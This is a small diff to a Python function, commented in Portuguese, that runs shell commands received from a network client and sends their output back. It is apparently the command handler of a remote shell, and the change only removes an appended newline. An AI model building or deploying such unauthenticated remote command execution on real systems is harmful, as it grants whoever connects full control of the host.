@@ -35,9 +35,9 @@ def cmd(client, data):
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output, errors = proc.communicate()  # Lê a saída e os erros
         if errors:
-            client.send(errors + "\n")  # Envia erros em bytes
+            client.send(errors)  # Envia erros em bytes
         else:
-            client.send(output + "\n")  # Envia a saída em bytes
+            client.send(output)  # Envia a saída em bytes
     except Exception as Error:
         print('ERROR: ', Error)
 
